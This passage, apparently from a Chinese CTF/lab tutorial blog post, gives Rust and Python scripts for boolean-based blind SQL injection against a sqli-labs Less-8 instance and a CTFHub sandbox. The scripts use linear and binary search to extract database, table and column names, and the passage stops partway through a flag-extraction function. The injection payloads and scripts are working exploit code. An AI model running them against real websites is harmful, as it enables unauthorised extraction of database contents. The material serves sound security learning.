+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="nn">std</span><span class="p">::</span><span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">mark</span> <span class="o">=</span> <span class="s">"You are in"</span><span class="p">;</span>
+
+    <span class="c1">// 类似于python的reqwest库</span>
+    <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">blocking</span><span class="p">::</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">body</span> <span class="o">=</span> <span class="n">r</span><span class="nf">.text</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="n">body</span><span class="nf">.contains</span><span class="p">(</span><span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nd">println!</span><span class="p">(</span><span class="s">"Yes! You are in!"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>可以看到输出为：</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Yes! You are <span class="k">in</span><span class="o">!</span>
+</code></pre></div></div>
+
+<p>如果不关注语法细节，整体的理解起来还是很简单的。而且没有 Golang 那样的编码问题。</p>
+
+<h3 id="完整的代码-2">完整的代码</h3>
+
+<p>与 Python 的逻辑类似，没有什么不同的地方。</p>
+
+<p>PS: 此处使用闭包来测量函数执行的时间。</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">time</span><span class="p">::</span><span class="n">Instant</span><span class="p">;</span>
+
+<span class="k">const</span> <span class="n">BASE_URL</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span> <span class="o">=</span> <span class="s">"http://192.168.3.104/Less-8/?id="</span><span class="p">;</span>
+<span class="k">const</span> <span class="n">MARK</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span> <span class="o">=</span> <span class="s">"You are in"</span><span class="p">;</span>
+
+<span class="c1">// https://stackoverflow.com/a/25182801/8587335</span>
+<span class="k">fn</span> <span class="n">measure_time</span><span class="o">&lt;</span><span class="n">F</span><span class="p">:</span> <span class="nf">FnOnce</span><span class="p">()</span><span class="o">&gt;</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">func</span><span class="p">:</span> <span class="n">F</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">start</span> <span class="o">=</span> <span class="nn">Instant</span><span class="p">::</span><span class="nf">now</span><span class="p">();</span>
+    <span class="nf">func</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">duration</span> <span class="o">=</span> <span class="n">start</span><span class="nf">.elapsed</span><span class="p">();</span>
+    <span class="nd">println!</span><span class="p">(</span><span class="s">"Time elapsed in {} is: {:?}"</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">duration</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">probe_database_linear</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="nb">String</span><span class="p">,</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="nn">std</span><span class="p">::</span><span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">db_name</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+
+    <span class="k">let</span> <span class="n">sql_payload</span> <span class="o">=</span> <span class="s">"database()"</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">while</span> <span class="o">!</span><span class="n">exit_flag</span> <span class="p">{</span>
+        <span class="c1">// always assume we will exit in this loop</span>
+        <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">32u8</span><span class="o">..</span><span class="mi">127u8</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">payload</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span>
+                <span class="s">"1' and ascii(substr({},{},{}))={} --+"</span><span class="p">,</span>
+                <span class="n">sql_payload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">i</span>
+            <span class="p">);</span>
+            <span class="k">let</span> <span class="n">url</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">,</span> <span class="n">BASE_URL</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+            <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">blocking</span><span class="p">::</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">body</span> <span class="o">=</span> <span class="n">r</span><span class="nf">.text</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">if</span> <span class="n">body</span><span class="nf">.contains</span><span class="p">(</span><span class="n">MARK</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">db_name</span><span class="nf">.push</span><span class="p">(</span><span class="n">i</span> <span class="k">as</span> <span class="nb">char</span><span class="p">);</span>
+                <span class="nd">println!</span><span class="p">(</span><span class="s">"database: {}"</span><span class="p">,</span> <span class="n">db_name</span><span class="p">);</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">Ok</span><span class="p">(</span><span class="n">db_name</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">probe_database_binary</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="nb">String</span><span class="p">,</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="nn">std</span><span class="p">::</span><span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">db_name</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+
+    <span class="k">let</span> <span class="n">sql_payload</span> <span class="o">=</span> <span class="s">"database()"</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">while</span> <span class="o">!</span><span class="n">exit_flag</span> <span class="p">{</span>
+        <span class="c1">// always assume we will exit in this loop</span>
+        <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+
+        <span class="k">let</span> <span class="k">mut</span> <span class="n">low</span> <span class="o">=</span> <span class="mi">32u8</span><span class="p">;</span>
+        <span class="k">let</span> <span class="k">mut</span> <span class="n">high</span> <span class="o">=</span> <span class="mi">126u8</span><span class="p">;</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">payload</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span>
+                <span class="s">"1' and ascii(substr({},{},{}))={} --+"</span><span class="p">,</span>
+                <span class="n">sql_payload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">mid</span>
+            <span class="p">);</span>
+            <span class="k">let</span> <span class="n">url</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">,</span> <span class="n">BASE_URL</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+            <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">blocking</span><span class="p">::</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">body</span> <span class="o">=</span> <span class="n">r</span><span class="nf">.text</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">if</span> <span class="n">body</span><span class="nf">.contains</span><span class="p">(</span><span class="n">MARK</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">db_name</span><span class="nf">.push</span><span class="p">(</span><span class="n">mid</span> <span class="k">as</span> <span class="nb">char</span><span class="p">);</span>
+                <span class="nd">println!</span><span class="p">(</span><span class="s">"database: {}"</span><span class="p">,</span> <span class="n">db_name</span><span class="p">);</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="c1">// another test for narrow down left or right range to search</span>
+            <span class="k">let</span> <span class="n">payload</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span>
+                <span class="s">"1' and ascii(substr({},{},{}))&gt;{} --+"</span><span class="p">,</span>
+                <span class="n">sql_payload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">mid</span>
+            <span class="p">);</span>
+            <span class="k">let</span> <span class="n">url</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">,</span> <span class="n">BASE_URL</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
+            <span class="k">let</span> <span class="n">r</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">blocking</span><span class="p">::</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">let</span> <span class="n">body</span> <span class="o">=</span> <span class="n">r</span><span class="nf">.text</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+            <span class="k">match</span> <span class="n">body</span><span class="nf">.contains</span><span class="p">(</span><span class="n">MARK</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">true</span> <span class="k">=&gt;</span> <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+                <span class="k">false</span> <span class="k">=&gt;</span> <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nf">Ok</span><span class="p">(</span><span class="n">db_name</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nf">measure_time</span><span class="p">(</span><span class="s">"Linear"</span><span class="nf">.to_string</span><span class="p">(),</span> <span class="p">||</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">probe_database_linear</span><span class="p">();</span>
+    <span class="p">});</span>
+
+    <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">measure_time</span><span class="p">(</span><span class="s">"Binary"</span><span class="nf">.to_string</span><span class="p">(),</span> <span class="p">||</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">probe_database_binary</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>同样来看一下时间：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database: s
+database: se
+database: sec
+database: secu
+database: secur
+database: securi
+database: securit
+database: security
+Time elapsed <span class="k">in </span>Linear is: 5.873950016s
+database: s
+database: se
+database: sec
+database: secu
+database: secur
+database: securi
+database: securit
+database: security
+Time elapsed <span class="k">in </span>Binary is: 788.546473ms
+</code></pre></div></div>
+<p>时间还是比 Golang 要长一点，所以还是 Golang 可能会更香一点。</p>
+
+<h1 id="实践">实践</h1>
+<ol>
+  <li>启动测试环境</li>
+</ol>
+
+<p>在 CTFHub 上启动布尔盲注题目环境。获得环境链接如下：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/
+</code></pre></div></div>
+
+<ol>
+  <li>完整的盲注过程代码</li>
+</ol>
+
+<p>这部分的代码，有几个需要注意的点：</p>
+<ul>
+  <li>代码中通过 <code class="language-plaintext highlighter-rouge">sql_payload</code> 独立出来使语句变短以及可读</li>
+  <li>使用 <code class="language-plaintext highlighter-rouge">group_concat()</code> 函数来把多个结果绑成一个结果输出</li>
+</ul>
+
+<p>如果不用 <code class="language-plaintext highlighter-rouge">group_concat()</code>，那么需要通过调节 <code class="language-plaintext highlighter-rouge">limit 0,1</code> 来去“猜”不同的 ASCII 码。</p>
+
+<p>比如完整的 SQL 的 payload 如下：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 一次只能猜一个，除非调节limit的参数</span>
+sql_payload <span class="o">=</span> <span class="s2">"select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"</span>
+<span class="c"># 一次性把所有的结果用`,`链接（group_concat默认）</span>
+sql_payload <span class="o">=</span> <span class="s2">"select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = database()"</span>
+</code></pre></div></div>
+
+<p>这样一来，程序的逻辑也会降低。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/?id="</span>
+
+<span class="n">mark</span> <span class="o">=</span> <span class="s">'query_success'</span>
+
+
+<span class="c1"># more detail: https://stackoverflow.com/a/803626/8587335
+</span><span class="k">def</span> <span class="nf">measure_time</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="n">_</span> <span class="o">=</span> <span class="n">func</span><span class="p">()</span>
+    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Time: {} seconds"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">probe_database_linear</span><span class="p">():</span>
+    <span class="n">db_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}
+</span>
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> --+"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">db_name</span>
+
+
+<span class="k">def</span> <span class="nf">probe_database_binary</span><span class="p">():</span>
+    <span class="n">db_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}
+</span>
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+
+            <span class="c1"># another test for narrow down left or right range to search
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">db_name</span>
+
+
+<span class="k">def</span> <span class="nf">probe_table_binary</span><span class="p">(</span><span class="n">db_name</span><span class="p">):</span>
+    <span class="n">table_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># sql_payload = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"
+</span>    <span class="c1"># 这里解决了一个痛点：对于多个表名，通过group_concat()链接，那么就不需要去改变`limit 0,1`
+</span>    <span class="n">sql_payload</span> <span class="o">=</span> <span class="s">"select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = database()"</span>
+
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">table_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'table:'</span><span class="p">,</span> <span class="n">table_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+
+            <span class="c1"># another test for narrow down left or right range to search
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">table_name</span>
+
+
+<span class="k">def</span> <span class="nf">probe_column_binary</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
+    <span class="n">column_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># sql_payload = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"
+</span>    <span class="c1"># payload: select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'flag' and TABLE_SCHEMA = database()
+</span>    <span class="n">sql_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = '</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s">' and TABLE_SCHEMA = database()"</span>
+
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">column_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'column:'</span><span class="p">,</span> <span class="n">column_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+
+            <span class="c1"># another test for narrow down left or right range to search
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 and ascii(substr((</span><span class="si">{</span><span class="n">sql_payload</span><span class="si">}</span><span class="s">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s">"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">column_name</span>
+
+
+<span class="k">def</span> <span class="nf">probe_flag</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span><span class="p">):</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># payload: select flag from flag
